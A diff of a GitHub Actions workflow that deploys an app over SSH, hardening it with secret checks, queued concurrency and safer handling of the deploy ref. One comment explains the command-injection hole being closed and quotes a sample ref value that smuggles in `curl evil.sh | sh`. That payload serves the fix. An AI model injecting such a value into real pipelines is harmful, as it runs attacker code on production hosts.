@@ -2,7 +2,10 @@ name: Manual Deploy (SSH template)
 
 # Manual production deploy over SSH. No hardcoded hosts/secrets — all via GitHub Secrets.
 # Required secrets: SSH_HOST, SSH_USER, SSH_KEY, APP_DIR (e.g. /opt/aidataplatform).
-# Optional: DOMAIN (for TLS hint passthrough).
+# Optional: SSH_PORT (default 22), DOMAIN (for TLS hint passthrough).
+#
+# workflow_dispatch only, so no path filter applies here: a deploy must be
+# possible from any commit on any branch, which is the point of a manual trigger.
 on:
   workflow_dispatch:
     inputs:
@@ -11,24 +14,103 @@ on:
         required: false
         default: main
 
+permissions:
+  contents: read
+
+# Deliberately NOT cancel-in-progress. A newer dispatch must never abort a
+# half-applied deploy (migrations run in the middle) — queue instead.
+concurrency:
+  group: deploy-${{ github.workflow }}
+  cancel-in-progress: false
+
 jobs:
   deploy:
+    name: Deploy ${{ inputs.ref }}
     runs-on: ubuntu-latest
+    timeout-minutes: 45
     steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      # Prints the NAMES of missing secrets only, never their values.
+      - name: Validate deploy secrets are present
+        env:
+          SSH_HOST: ${{ secrets.SSH_HOST }}
+          SSH_USER: ${{ secrets.SSH_USER }}
+          SSH_KEY: ${{ secrets.SSH_KEY }}
+          APP_DIR: ${{ secrets.APP_DIR }}
+        run: |
+          # Indirect expansion (${!name}), never `eval value=$(...)`: SSH_KEY is a
+          # multi-line PEM and eval would try to execute the key as a command.
+          missing=""
+          for name in SSH_HOST SSH_USER SSH_KEY APP_DIR; do
+            if [ -z "${!name}" ]; then
+              missing="$missing $name"
+            fi
+          done
+          if [ -n "$missing" ]; then
+            echo "::error::Missing required repository secrets:$missing"
+            exit 1
+          fi
+          echo "All required deploy secrets are present."
+
+      # REF and APP_DIR travel via `envs`, not via ${{ }} inside the script body.
+      # Interpolating inputs.ref directly into the remote script is a command
+      # injection: a ref containing `"; curl evil.sh | sh; #` would execute on the
+      # production host.
       - name: Deploy via SSH
-        uses: appleboy/ssh-action@v1.0.3
+        uses: appleboy/ssh-action@v1
+        env:
+          REF: ${{ inputs.ref }}
+          APP_DIR: ${{ secrets.APP_DIR }}
         with:
           host: ${{ secrets.SSH_HOST }}
           username: ${{ secrets.SSH_USER }}
           key: ${{ secrets.SSH_KEY }}
           port: ${{ secrets.SSH_PORT || 22 }}
+          envs: REF,APP_DIR
           script: |
-            set -euo pipefail
-            cd "${{ secrets.APP_DIR }}"
-            git fetch --all
-            git checkout "${{ inputs.ref }}"
-            git pull --ff-only
-            docker compose up -d --build
+            # `set -e` only. Not -o pipefail: appleboy/ssh-action feeds this
+            # through sh, and dash rejects `set -o pipefail` outright, which would
+            # abort the deploy on line one.
+            set -eu
+
+            command -v docker >/dev/null 2>&1 || { echo "docker not installed on host" >&2; exit 1; }
+            docker compose version >/dev/null 2>&1 || { echo "docker compose v2 plugin missing" >&2; exit 1; }
+
+            [ -d "$APP_DIR" ] || { echo "APP_DIR does not exist: $APP_DIR" >&2; exit 1; }
+            [ -f "$APP_DIR/.env" ] || { echo "missing $APP_DIR/.env — run infrastructure/scripts/deploy-ubuntu24.sh first" >&2; exit 1; }
+
+            cd "$APP_DIR"
+
+            # Fetch first, then resolve: a branch pushed since the last deploy is
+            # not in origin/ until this runs, and the old order would reject it.
+            git fetch --all --tags --prune
+
+            # Resolve the ref before touching HEAD. Accepts a branch, a tag or a
+            # sha; refuses to deploy an unknown ref instead of silently staying
+            # on whatever was checked out before.
+            if ! git rev-parse --verify --quiet "origin/${REF}^{commit}" >/dev/null 2>&1 \
+               && ! git rev-parse --verify --quiet "${REF}^{commit}" >/dev/null 2>&1; then
+              echo "Deploy ref not found: $REF" >&2
+              exit 1
+            fi
+
+            # Detached HEAD pins the deployed commit. The old `git checkout` +
+            # `git pull --ff-only` pair broke for any tag or sha, because you
+            # cannot fast-forward a detached checkout.
+            git checkout --detach "$REF"
+            echo "deployed commit: $(git rev-parse HEAD)"
+
+            docker compose pull
+            # --wait blocks until every service reports healthy, so the
+            # healthcheck below is not racing container startup.
+            docker compose up -d --build --wait --wait-timeout 300
+
             docker compose exec -T laravel php artisan migrate --force
+
+            # infrastructure/scripts/healthcheck.sh exists and exits non-zero on
+            # any failed probe, so a bad deploy fails the job.
             bash infrastructure/scripts/healthcheck.sh
+
             docker compose ps
